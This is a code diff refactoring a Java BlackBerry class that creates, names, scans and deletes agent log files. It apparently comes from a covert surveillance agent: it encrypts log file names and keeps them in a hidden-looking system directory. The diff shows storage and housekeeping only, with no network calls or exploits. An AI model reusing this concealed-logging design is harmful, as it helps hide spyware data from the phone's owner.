@@ -18,7 +18,6 @@ import javax.microedition.io.file.FileConnection;
 import net.rim.device.api.system.PersistentObject;
 import net.rim.device.api.system.PersistentStore;
 import net.rim.device.api.util.NumberUtilities;
-
 import blackberry.agent.Agent;
 import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
@@ -30,7 +29,7 @@ import blackberry.utils.Debug;
 import blackberry.utils.DebugLevel;
 
 public class LogCollector implements Singleton {
-	//#debug
+    //#debug
     private static Debug debug = new Debug("LogCollector", DebugLevel.VERBOSE);
 
     static LogCollector instance = null;
@@ -46,17 +45,20 @@ public class LogCollector implements Singleton {
     public static final int MAX_LOG_NUM = 25000; // Numero massimo di log che
     // creeremo
     private static final long PERSISTENCE_KEY = 0x6f20a847b93765c8L; // Chiave
+
     // arbitraria
     // di
     // accesso
 
-    // public boolean storeToMMC;
-    Vector logVector;
+    public static String decryptName(final String logMask) {
+        return Encryption.decryptName(logMask, Keys.getInstance()
+                .getChallengeKey()[0]);
+    }
 
-    private int logProgressive;
-    private PersistentObject logProgressivePersistent;
-
-    Keys keys;
+    public static String encryptName(final String logMask) {
+        return Encryption.encryptName(logMask, Keys.getInstance()
+                .getChallengeKey()[0]);
+    }
 
     public static synchronized LogCollector getInstance() {
         if (instance == null) {
@@ -66,6 +68,20 @@ public class LogCollector implements Singleton {
         return instance;
     }
 
+    private static int getLogNum() {
+        // TODO Auto-generated method stub
+        return 0;
+    }
+
+    // public boolean storeToMMC;
+    Vector logVector;
+
+    private int logProgressive;
+
+    private PersistentObject logProgressivePersistent;
+
+    Keys keys;
+
     protected LogCollector() {
         super();
         logVector = new Vector();
@@ -74,30 +90,15 @@ public class LogCollector implements Singleton {
         keys = Keys.getInstance();
     }
 
-    private static int getLogNum() {
-        // TODO Auto-generated method stub
-        return 0;
-    }
-
     private void clear() {
         // TODO Auto-generated method stub
 
     }
 
-    public static String encryptName(String logMask) {
-        return Encryption.encryptName(logMask, Keys.getInstance()
-                .getChallengeKey()[0]);
-    }
-
-    public static String decryptName(String logMask) {
-        return Encryption.decryptName(logMask, Keys.getInstance()
-                .getChallengeKey()[0]);
-    }
-
     private synchronized int deserializeProgressive() {
         logProgressivePersistent = PersistentStore
                 .getPersistentObject(PERSISTENCE_KEY);
-        Object obj = logProgressivePersistent.getContents();
+        final Object obj = logProgressivePersistent.getContents();
 
         if (obj == null) {
             // #debug
@@ -105,30 +106,35 @@ public class LogCollector implements Singleton {
             logProgressivePersistent.setContents(new Integer(1));
         }
 
-        int logProgressiveRet = ((Integer) logProgressivePersistent
+        final int logProgressiveRet = ((Integer) logProgressivePersistent
                 .getContents()).intValue();
         return logProgressiveRet;
     }
 
-    protected synchronized int getNewProgressive() {
-        logProgressive++;
-        logProgressivePersistent.setContents(new Integer(logProgressive));
-
-        // #debug
-        debug.trace("Progressive: " + logProgressive);
-        return logProgressive;
-    }
-
-    public synchronized Log factory(Agent agent, boolean onSD) {
+    public synchronized Log factory(final Agent agent, final boolean onSD) {
         if (getLogNum() > MAX_LOG_NUM) {
             // #debug
             debug.error("Max log reached");
             return null;
         }
 
-        Log log = new Log(agent, keys.getAesKey());
+        final Log log = new Log(agent, keys.getAesKey());
 
         return log;
+    }
+
+    public Vector getLogs(final String basePath) {
+        final Vector allLogs = new Vector();
+
+        final Vector dirs = scanForDirLogs(basePath);
+        final int size = dirs.size();
+        for (int i = 0; i < size; ++i) {
+            final String dir = (String) dirs.elementAt(i);
+            final Vector logs = scanForLogs(basePath, dir);
+            allLogs.addElement(logs);
+        }
+
+        return allLogs;
     }
 
     /*
@@ -145,41 +151,63 @@ public class LogCollector implements Singleton {
      * //NumberUtilities.toString(hidate, 16, 8); return newname; }
      */
 
-    private String makeDateName(Date date) {
-        long millis = date.getTime();
-        long mask = (long) 1E4;
-        int lodate = (int) (millis % mask);
-        int hidate = (int) (millis / mask);
+    protected synchronized int getNewProgressive() {
+        logProgressive++;
+        logProgressivePersistent.setContents(new Integer(logProgressive));
 
-        String newname = NumberUtilities.toString(lodate, 16, 8)
+        // #debug
+        debug.trace("Progressive: " + logProgressive);
+        return logProgressive;
+    }
+
+    private String makeDateName(final Date date) {
+        final long millis = date.getTime();
+        final long mask = (long) 1E4;
+        final int lodate = (int) (millis % mask);
+        final int hidate = (int) (millis / mask);
+
+        final String newname = NumberUtilities.toString(lodate, 16, 8)
                 + NumberUtilities.toString(hidate, 16, 8);
 
         return newname;
     }
 
-    public synchronized Vector makeNewName(Log log, Agent agent) {
+    public synchronized Vector makeNewName(final Log log, final Agent agent) {
 
-        boolean onSD = agent.onSD();
-        Date timestamp = log.timestamp;
-        int progressive = getNewProgressive();
+        final boolean onSD = agent.onSD();
+        final Date timestamp = log.timestamp;
+        final int progressive = getNewProgressive();
 
-        Vector vector = new Vector();
+        final Vector vector = new Vector();
 
         // log.SetProgressive(progressive);
 
-        String basePath = onSD ? Path.LOG_PATH : Path.USER_PATH;
+        final String basePath = onSD ? Path.LOG_PATH : Path.USER_PATH;
 
-        String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
-        String fileName = progressive + "!" + this.makeDateName(timestamp);
+        final String blockDir = "_" + (progressive / LOG_PER_DIRECTORY);
+        final String fileName = progressive + "!"
+                + this.makeDateName(timestamp);
 
-        String encName = Encryption.encryptName(fileName + LOG_EXTENSION, keys
-                .getChallengeKey()[0]);
+        final String encName = Encryption.encryptName(fileName + LOG_EXTENSION,
+                keys.getChallengeKey()[0]);
 
         vector.addElement(new Integer(progressive));
         vector.addElement(basePath + Path.LOG_DIR_BASE); // file:///SDCard/BlackBerry/system/$RIM313/$1
         vector.addElement(blockDir); // 1
         vector.addElement(encName); // ?
         return vector;
+    }
+
+    public void remove(final String logName) {
+        // #debug
+        debug.info("Removing file: " + logName);
+        final AutoFlashFile file = new AutoFlashFile(logName, false);
+        if (file.exists()) {
+            file.delete();
+        } else {
+            // #debug
+            debug.warn("File doesn't exists: " + logName);
+        }
     }
 
     /**
@@ -190,93 +218,23 @@ public class LogCollector implements Singleton {
 
     }
 
-    public Vector getLogs(String basePath) {
-        Vector allLogs = new Vector();
-
-        Vector dirs = scanForDirLogs(basePath);
-        int size = dirs.size();
-        for (int i = 0; i < size; ++i) {
-            String dir = (String) dirs.elementAt(i);
-            Vector logs = scanForLogs(basePath, dir);
-            allLogs.addElement(logs);
-        }
-
-        return allLogs;
-    }
-
-    /**
-     * Estrae la lista di log nella forma *.MOB dentro la directory specificata
-     * da currentPath, nella forma 1_n
-     * 
-     * @param currentPath
-     * @return
-     */
-    public Vector scanForLogs(String currentPath, String dir) {
+    public Vector scanForDirLogs(final String currentPath) {
         // #ifdef DBC
         Check.requires(currentPath != null, "null argument");
         // #endif
 
-        Vector vector = new Vector();
-
-        FileConnection fcDir = null;
-        // FileConnection fcFile = null;
-        try {
-            fcDir = (FileConnection) Connector.open(currentPath + dir);
-            Enumeration fileLogs = fcDir.list("*", true);
-
-            while (fileLogs.hasMoreElements()) {
-                String file = (String) fileLogs.nextElement();
-
-                // fcFile = (FileConnection) Connector.open(fcDir.getURL() +
-                // file);
-                // e' un file, vediamo se e' un file nostro
-                String logMask = LogCollector.LOG_EXTENSION;
-                String encLogMask = encryptName(logMask);
-
-                if (file.endsWith(encLogMask)) {
-                    // String encName = fcFile.getName();
-                    // #debug
-                    debug.trace("enc name: " + file);
-                    String plainName = decryptName(file);
-                    // #debug
-                    debug.trace("plain name: " + plainName);
-
-                    vector.addElement(file);
-                }
-            }
-
-        } catch (IOException e) {
-            e.printStackTrace();
-
-        } finally {
-            if (fcDir != null) {
-                try {
-                    fcDir.close();
-                } catch (IOException e) {
-                    // TODO Auto-generated catch block
-                    e.printStackTrace();
-                }
-            }
-        }
-        return vector;
-    }
-
-    public Vector scanForDirLogs(String currentPath) {
-        // #ifdef DBC
-        Check.requires(currentPath != null, "null argument");
-        // #endif
-
-        Vector vector = new Vector();
+        final Vector vector = new Vector();
         FileConnection fc;
 
         try {
             fc = (FileConnection) Connector.open(currentPath);
 
             if (fc.isDirectory()) {
-                Enumeration fileLogs = fc.list(Path.LOG_DIR_BASE + "*", true);
+                final Enumeration fileLogs = fc.list(Path.LOG_DIR_BASE + "*",
+                        true);
 
                 while (fileLogs.hasMoreElements()) {
-                    String dir = (String) fileLogs.nextElement();
+                    final String dir = (String) fileLogs.nextElement();
                     // scanForLogs(dir);
                     // return scanForLogs(file);
                     vector.addElement(dir);
@@ -286,11 +244,68 @@ public class LogCollector implements Singleton {
 
             fc.close();
 
-        } catch (IOException e) {
+        } catch (final IOException e) {
             e.printStackTrace();
 
         }
 
+        return vector;
+    }
+
+    /**
+     * Estrae la lista di log nella forma *.MOB dentro la directory specificata
+     * da currentPath, nella forma 1_n
+     * 
+     * @param currentPath
+     * @return
+     */
+    public Vector scanForLogs(final String currentPath, final String dir) {
+        // #ifdef DBC
+        Check.requires(currentPath != null, "null argument");
+        // #endif
+
+        final Vector vector = new Vector();
+
+        FileConnection fcDir = null;
+        // FileConnection fcFile = null;
+        try {
+            fcDir = (FileConnection) Connector.open(currentPath + dir);
+            final Enumeration fileLogs = fcDir.list("*", true);
+
+            while (fileLogs.hasMoreElements()) {
+                final String file = (String) fileLogs.nextElement();
+
+                // fcFile = (FileConnection) Connector.open(fcDir.getURL() +
+                // file);
+                // e' un file, vediamo se e' un file nostro
+                final String logMask = LogCollector.LOG_EXTENSION;
+                final String encLogMask = encryptName(logMask);
+
+                if (file.endsWith(encLogMask)) {
+                    // String encName = fcFile.getName();
+                    // #debug
+                    debug.trace("enc name: " + file);
+                    final String plainName = decryptName(file);
+                    // #debug
+                    debug.trace("plain name: " + plainName);
+
+                    vector.addElement(file);
+                }
+            }
+
+        } catch (final IOException e) {
+            e.printStackTrace();
+
+        } finally {
+            if (fcDir != null) {
+                try {
+                    fcDir.close();
+                } catch (final IOException e) {
+                    // TODO Auto-generated catch block
+                    e.printStackTrace();
+                }
+            }
+        }
         return vector;
     }
 
@@ -309,18 +324,6 @@ public class LogCollector implements Singleton {
 
         // costruisce le directory secondo storeToMMC
 
-    }
-
-    public void remove(String logName) {
-        // #debug
-        debug.info("Removing file: " + logName);
-        AutoFlashFile file = new AutoFlashFile(logName, false);
-        if (file.exists()) {
-            file.delete();
-        } else {
-            // #debug
-            debug.warn("File doesn't exists: " + logName);
-        }
     }
 
 }
